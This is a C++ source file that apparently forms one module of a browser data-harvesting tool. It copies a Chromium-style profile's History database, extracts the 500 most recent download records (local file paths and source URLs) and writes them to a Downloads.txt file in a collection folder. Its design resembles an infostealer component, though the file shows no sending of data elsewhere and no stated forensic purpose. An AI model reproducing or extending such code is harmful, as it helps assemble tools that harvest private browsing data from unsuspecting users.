//
// Created by .1qxz on 08.06.2024.
//

#include "CDownloads.h"

void CDownloads::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->getProfileDir(browser_root) / "History";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<Download> history = CDownloads::getDownloads(copied_db);

    fs::remove(copied_db);

    if(history.empty())
        return;

    std::stringstream ss;

    for(Download &row : history)
        row.write(ss);

    Utils::writeFile(root / "Downloads.txt", ss.str(), true);
}

std::list<Download> CDownloads::getDownloads(const fs::path &db_path) {
    std::list<Download> downloads;

    SQLiteUtil::connectAndRead("SELECT current_path, tab_url FROM downloads ORDER BY start_time DESC LIMIT 500", db_path, [&downloads](sqlite3_stmt* stmt) {
        const unsigned char* target_path = sqlite3_column_text(stmt, 0);
        const unsigned char* tab_url = sqlite3_column_text(stmt, 1);

        Download downloadRecord;
        downloadRecord.saved_as = std::string(reinterpret_cast<const char*>(target_path));
        downloadRecord.url = std::string(reinterpret_cast<const char*>(tab_url));

        downloads.push_back(downloadRecord);
    });

    return downloads;
}
